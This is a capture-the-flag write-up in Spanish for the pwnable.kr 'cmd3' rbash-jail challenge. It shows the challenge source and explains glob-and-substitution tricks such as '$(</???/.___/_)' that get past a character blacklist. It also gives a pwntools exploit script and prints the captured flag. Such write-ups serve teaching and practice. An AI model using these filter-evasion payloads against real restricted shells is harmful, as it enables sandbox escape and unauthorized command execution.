# cmd3

![img](https://raw.githubusercontent.com/Calana2/Writeups/main/pwnable.kr/Grotesque/cmd3.png)

```py
#!/usr/bin/python2
import base64, random, math
import os, sys, time, string
from threading import Timer

def rstring(N):
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

password = rstring(32)
filename = rstring(32)

TIME = 60
class MyTimer():
        global filename
        timer=None
        def __init__(self):
                self.timer = Timer(TIME, self.dispatch, args=[])
                self.timer.start()
        def dispatch(self):
                print 'time expired! bye!'
                sys.stdout.flush()
                os.system('rm flagbox/'+filename)
                os._exit(0)

def filter(cmd):
        blacklist = '` !&|"\'*'
        for c in cmd:
                if ord(c)>0x7f or ord(c)<0x20: return False
                if c.isalnum(): return False
                if c in blacklist: return False
        return True

if __name__ == '__main__':
        MyTimer()
        print 'your password is in flagbox/{0}'.format(filename)
        os.system("ls -al")
        os.system("ls -al jail")
        open('flagbox/'+filename, 'w').write(password)
        try:
                while True:
                        sys.stdout.write('cmd3$ ')
                        sys.stdout.flush()
                        cmd = raw_input()
                        if cmd==password:
                                os.system('./flagbox/print_flag')
                                raise 1
                        if filter(cmd) is False:
                                print 'caught by filter!'
                                sys.stdout.flush()
                                raise 1

                        os.system('echo "{0}" | base64 -d - | env -i PATH=jail /bin/rbash'.format(cmd.encode('base64')))
                        sys.stdout.flush()
        except:
                os.system('rm flagbox/'+filename)
                os._exit(0)
```

Podemos ejecutar comandos en una shell `rbash` con un filtro muy restrictivo. Podemos usar estos caracteres:
`# $ % ( ) + , - . / : ; < = > ? @ [ \ ] ^ _ { } ~ \`

Con lo que tenemos podemos abusar de las expansiones de shell con `$` y del glob `?`. Hay muchas soluciones a esto. Pero describiré la que considero fue la mas sencilla que alguien usó.

Con el operador '?' podemos hacer coincidir comandos, ya que '?' significa cualquier caracter. Por ejemplo, si queremos hacer coincidir el patrón con jail/cat hacemos esto:
```
cmd3@ubuntu:~$ nc 0 9023
total 128
drwxr-x---   5 root cmd3_pwn  4096 Jun  7  2025 .
drwxr-xr-x 118 root root      4096 Jun  1  2025 ..
d---------   2 root root      4096 Jan 22  2016 .bash_history
-rwxr-x---   1 root cmd3_pwn  1422 Apr  1  2025 cmd3.py
drwx-wx---   2 root cmd3_pwn 20480 Jan 28 19:04 flagbox
drwxr-x---   2 root cmd3_pwn  4096 Jan 22  2016 jail
-rw-r--r--   1 root root     81885 Dec 21 22:37 log
-rw-r-----   1 root root       764 Mar 10  2016 super.pl
total 8
drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .
drwxr-x--- 5 root cmd3_pwn 4096 Jun  7  2025 ..
lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -> /bin/cat
lrwxrwxrwx 1 root root       11 Jan 22  2016 id -> /usr/bin/id
lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -> /bin/ls
your password is in flagbox/4K72PCH8EFC4F6YTZW5H4AQY9PUBYIOA
cmd3$ ????/???
/bin/rbash: line 1: jail/cat: restricted: cannot specify `/' in command names
```
'????/???' se interpreta como "la ruta que coincida con cuatro caracteres cualquiera seguidos de '/' seguidos de tres caracteres cualquiera". Dado que la única ruta que cumple esta condición es jail/cat, la shell hace el reemplazo.

No podemos usar espacios pero podemos redirigir el contenido de un archivo con '<'. Pero aunque es posible llegar a ejecutar 'cat<flagbox/4K72PCH8EFC4F6YTZW5H4AQY9PUBYIOA' por otra via que no exploraré aqui, esto fallará con error `restricted: cannot specify '/' in command names`.

Una solucion es escribir 'cat flagbox/4K72PCH8EFC4F6YTZW5H4AQY9PUBYIOA' en un archivo en `/tmp` (directorio donde cualquiera puede leer/escribir) como por ejemplo `/tmp/.___/_` (así para que sea único el emparejamiento cuando usemos '?') y luego ejecutarlo.

Es posible crear un directorio y copiarlo porque el programa corre en el mismo sistema de archivos:
```
cat readme
if you connect to port 9023, the "cmd3.py" script will be executed under cmd3_pwn privilege.
type 'nc 0 9023' to play this challenge.  have fun escaping from rbash jail :)
FYI, 'print_flag' is the program which prints out the flag of cmd3.
 ls /home/
aeg         blackjack      coin1_pwn     dragon_pwn     input2_pwn     loveletter         note            rsa_calculator      syscall
aeg_pwn     blackjack_pwn  coin2         echo2          kcrc           loveletter_pwn     note_pwn        rsa_calculator_pwn  tiny_easy
ascii       bof            coin2_pwn     echo2_pwn      kcrc_pwn       malware            nuclear         runall.sh           tiny_easy_pwn
ascii_easy  bof_pwn        col           elf            leakme         malware_pwn        nuclear_pwn     sadmin              tiny_hard
ascii_pwn   brainfuck      crashgen      elf_pwn        leakme_pwn     maze               otp             simplelogin         tiny_hard_pwn
asg         brainfuck_pwn  crashgen_pwn  exynos         leg            maze_pwn           otp_pwn         simplelogin_pwn     towelroot
asg_pwn     chatbot        crcgen_pwn    fd             legacy_challs  md5calculator      passcode        sizcaller           towelroot_pwn
asm         chatbot_pwn    crypto1       grail          lfh            md5calculator_pwn  passcode_pwn    sizcaller_pwn       uaf
asm2        cmd1           crypto1_pwn   horcruxes      lfh_pwn        memcpy             pwnsandbox      softmmu             uaf_pwn
asm2_pwn    cmd2           daehee        horcruxes_pwn  lokihardt      memcpy_pwn         pwnsandbox_pwn  softmmu_pwn         unlink
asm3        cmd3           dos           hunter         lokihardt_pwn  mipstake           random          sshmonitor          unlink_pwn
asm3_pwn    cmd3_pwn <--   dos_pwn       hunter_pwn     lotto          mipstake_pwn       random_pwn      starcraft           wtf
asm_pwn     coin1          dragon        input2         lotto_pwn      mistake            rootkit         starcraft_pwn       wtf_pwn
```

```py
from pwn import *
import os

io = remote("0.0.0.0",9023);

io.recvuntil(b"is in flagbox/");
filename = io.recvline().strip().decode();
io.info("Filename: " + filename);

os.system(f'mkdir -p /tmp/.___ && echo "cat flagbox/{filename}" > /tmp/.___/_');
io.recvuntil(b"$ ");
io.interactive()
```

Sin embargo ocurre lo siguiente:
```
$ /???/.___/_
/bin/rbash: line 1: /tmp/.___/_: restricted: cannot specify `/' in command names
```

El problema es que `/???/.___/_` es interpretado como un comando y caemos en el mismo error. Pero `$(</???/.___/_)` no :)

La sintaxis "</ruta/archivo" significa "redirige la entrada estándar desde ese archivo…", el nombre del archivo es válido en nuestro contexto. Si lo ejecutamos dentro de `$()` la shell lo expande a `$(contenido del archivo)` y luego ejecuta su contenido. Haciendo efectivamente un `cat flagbox/{filename}`.

Agregamos esto al exploit:
```py
# io.interactive()
io.sendline(b"$(</???/.___/_)");

password = io.recv(32);
io.info("Password: " + password.decode());

io.sendline(password);
io.recvuntil(b"Congratz! here is flag : ");
flag = io.recv(100).decode();
io.info("Flag: " + flag);
```

`b4sh_sYnt4x_1s_Fun`